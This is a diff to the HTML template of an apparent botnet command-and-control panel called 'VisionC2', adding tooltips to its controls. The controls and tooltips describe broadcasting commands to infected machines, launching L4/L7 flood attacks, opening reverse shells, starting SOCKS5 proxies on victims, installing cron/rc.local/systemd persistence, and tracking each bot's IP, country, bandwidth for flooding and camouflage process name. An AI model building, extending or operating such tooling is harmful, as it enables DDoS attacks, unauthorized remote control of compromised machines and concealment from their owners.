@@ -13,7 +13,7 @@
         <div class="brand">&#9790;&#8483;&#9790; VisionC2 <span class="sse-indicator sse-disconnected" id="sse-dot"
                 title="Connecting..."></span></div>
         <div class="nav">
-            <button class="theme-toggle" onclick="toggleTheme()" id="theme-toggle" title="Toggle theme">
+            <button class="theme-toggle" onclick="toggleTheme()" id="theme-toggle" data-tooltip="Toggle light / dark mode" class="tt-below">
                 <svg class="theme-icon sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
                     stroke-linecap="round" stroke-linejoin="round">
                     <circle cx="12" cy="12" r="5" />
@@ -32,8 +32,8 @@
                 </svg>
             </button>
             <select id="global-theme-picker" onchange="applyGlobalTheme(this.value)" title="Panel theme" style="background:var(--bg-card,#161b22);color:var(--text,#c9d1d9);border:1px solid var(--border,#30363d);border-radius:6px;padding:4px 8px;font-size:12px;cursor:pointer"></select>
-            <button class="help-btn" onclick="toggleHelp()" title="Keyboard shortcuts (?)">?</button>
-            <button class="notif-toggle" onclick="toggleNotifs()" id="notif-btn">Notifications <span class="notif-badge"
+            <button class="help-btn" onclick="toggleHelp()" data-tooltip="Keyboard shortcuts" class="tt-below">?</button>
+            <button class="notif-toggle" onclick="toggleNotifs()" id="notif-btn" data-tooltip="Bot connect / disconnect history" class="tt-below">Notifications <span class="notif-badge"
                     id="notif-badge" style="display:none">0</span></button>
             <a href="/logout">Logout</a>
         </div>
@@ -96,25 +96,26 @@
                 </select>
                 <div id="arg-fields" class="cmd-args"></div>
                 <div class="cmd-target-wrap">
-                    <input type="text" id="cmd-bot" placeholder="target: all bots" class="cmd-target" autocomplete="off">
+                    <input type="text" id="cmd-bot" placeholder="target: all bots" class="cmd-target" autocomplete="off"
+                        title="Leave blank to broadcast to all bots, or enter a Bot ID / group name to single-target">
                     <button class="cmd-target-clear" id="cmd-target-clear" onclick="clearCmdTarget()"
                         title="Clear target" style="display:none">&times;</button>
                 </div>
-                <button class="cmd-btn cmd-send" onclick="sendCmd()">Send</button>
+                <button class="cmd-btn cmd-send" onclick="sendCmd()" data-tooltip="Send command to target (or all bots if no target set)">Send</button>
             </div>
         </div>
 
         <!-- Tab bar -->
         <div class="tab-bar">
-            <button class="tab active" data-tab="tab-bots" onclick="switchTab(this)">Bots <span class="tab-count"
+            <button class="tab active" data-tab="tab-bots" onclick="switchTab(this)" data-tooltip="All connected bots and their stats">Bots <span class="tab-count"
                     id="tab-bots-count">0</span></button>
-            <button class="tab" data-tab="tab-socks" onclick="switchTab(this)">SOCKS <span class="tab-count"
+            <button class="tab" data-tab="tab-socks" onclick="switchTab(this)" data-tooltip="Active SOCKS5 proxies and relay health">SOCKS <span class="tab-count"
                     id="tab-socks-count">0</span></button>
-            <button class="tab" data-tab="tab-attack" onclick="switchTab(this)">Attack</button>
-            <button class="tab" data-tab="tab-activity" onclick="switchTab(this)">Activity</button>
-            <button class="tab" data-tab="tab-tasks" onclick="switchTab(this);loadTasks()">Tasks <span class="tab-count"
+            <button class="tab" data-tab="tab-attack" onclick="switchTab(this)" data-tooltip="Launch L4/L7 flood attacks against a target">Attack</button>
+            <button class="tab" data-tab="tab-activity" onclick="switchTab(this)" data-tooltip="Real-time event log — connections, disconnects, commands">Activity</button>
+            <button class="tab" data-tab="tab-tasks" onclick="switchTab(this);loadTasks()" data-tooltip="Scheduled recurring commands sent on a cron interval">Tasks <span class="tab-count"
                     id="tab-tasks-count">0</span></button>
-            <button class="tab" data-tab="tab-users" onclick="switchTab(this);loadUsers()">Users</button>
+            <button class="tab" data-tab="tab-users" onclick="switchTab(this);loadUsers()" data-tooltip="Manage operator accounts and permission levels">Users</button>
         </div>
 
         <!-- Tab: Bots -->
@@ -141,11 +142,11 @@
                 <div class="ms-info"><input type="checkbox" id="ms-select-all"
                         onchange="toggleSelectAll(this.checked)"><span id="ms-count">0 selected</span></div>
                 <div class="ms-actions">
-                    <button class="ms-btn ms-btn-group" onclick="msSetGroup()">Set Group</button>
-                    <button class="ms-btn" onclick="msOpenShells()">Open Shells</button>
-                    <button class="ms-btn" onclick="msCmd('!socks')">Start SOCKS</button>
-                    <button class="ms-btn" onclick="msCmd('!persist')">Persist</button>
-                    <button class="ms-btn ms-btn-danger" onclick="msKill()">Kill</button>
+                    <button class="ms-btn ms-btn-group" onclick="msSetGroup()" data-tooltip="Tag selected bots with a group name for batch targeting">Set Group</button>
+                    <button class="ms-btn" onclick="msOpenShells()" data-tooltip="Open an interactive reverse shell for each selected bot">Open Shells</button>
+                    <button class="ms-btn" onclick="msCmd('!socks')" data-tooltip="Start a SOCKS5 proxy on each selected bot">Start SOCKS</button>
+                    <button class="ms-btn" onclick="msCmd('!persist')" data-tooltip="Install cron + rc.local + systemd persistence on selected bots">Persist</button>
+                    <button class="ms-btn ms-btn-danger" onclick="msKill()" data-tooltip="Wipe all persistence, delete binary, and terminate — irreversible">Kill</button>
                 </div>
             </div>
             <div id="bot-table-wrap" class="bot-table-virtual">
@@ -154,28 +155,28 @@
                         <tr>
                             <th style="width:32px"><input type="checkbox" id="th-select-all"
                                     onchange="toggleSelectAll(this.checked)"></th>
-                            <th class="sortable" onclick="sortBots('botID')">Bot ID <span class="sort-arrow"
+                            <th class="sortable" onclick="sortBots('botID')" title="Unique bot identifier derived from hardware fingerprint">Bot ID <span class="sort-arrow"
                                     id="sort-botID"></span></th>
-                            <th class="sortable" onclick="sortBots('ip')">IP <span class="sort-arrow"
+                            <th class="sortable" onclick="sortBots('ip')" title="Bot's external IP address">IP <span class="sort-arrow"
                                     id="sort-ip"></span></th>
-                            <th class="sortable" onclick="sortBots('country')">Country <span class="sort-arrow"
+                            <th class="sortable" onclick="sortBots('country')" title="GeoIP country">Country <span class="sort-arrow"
                                     id="sort-country"></span></th>
-                            <th class="sortable" onclick="sortBots('group')">Group <span class="sort-arrow"
+                            <th class="sortable" onclick="sortBots('group')" title="Operator-assigned group tag — use for batch command targeting">Group <span class="sort-arrow"
                                     id="sort-group"></span></th>
-                            <th class="sortable" onclick="sortBots('arch')">Arch <span class="sort-arrow"
+                            <th class="sortable" onclick="sortBots('arch')" title="CPU architecture (amd64, arm64, mips, mipsle, …)">Arch <span class="sort-arrow"
                                     id="sort-arch"></span></th>
-                            <th class="sortable" onclick="sortBots('ram')">RAM <span class="sort-arrow"
+                            <th class="sortable" onclick="sortBots('ram')" title="Total system RAM">RAM <span class="sort-arrow"
                                     id="sort-ram"></span></th>
-                            <th class="sortable" onclick="sortBots('cpuCores')">CPU <span class="sort-arrow"
+                            <th class="sortable" onclick="sortBots('cpuCores')" title="Number of logical CPU cores">CPU <span class="sort-arrow"
                                     id="sort-cpuCores"></span></th>
-                            <th class="sortable" onclick="sortBots('uplinkMbps')">Uplink <span class="sort-arrow"
+                            <th class="sortable" onclick="sortBots('uplinkMbps')" title="Estimated outbound bandwidth — useful for picking flood sources">Uplink <span class="sort-arrow"
                                     id="sort-uplinkMbps"></span></th>
-                            <th class="sortable" onclick="sortBots('processName')">Process <span class="sort-arrow"
+                            <th class="sortable" onclick="sortBots('processName')" title="Camouflage process name the bot is masquerading as in the process table">Process <span class="sort-arrow"
                                     id="sort-processName"></span></th>
-                            <th class="sortable" onclick="sortBots('socksActive')">SOCKS <span class="sort-arrow"
+                            <th class="sortable" onclick="sortBots('socksActive')" title="Whether a SOCKS5 proxy is currently running on this bot">SOCKS <span class="sort-arrow"
                                     id="sort-socksActive"></span></th>
-                            <th>Uptime</th>
-                            <th>Last Ping</th>
+                            <th title="How long this bot has been connected in the current session">Uptime</th>
+                            <th title="Time since last heartbeat — goes red when stale (bot likely dead)">Last Ping</th>
                         </tr>
                     </thead>
                     <tbody id="bot-tbody"></tbody>
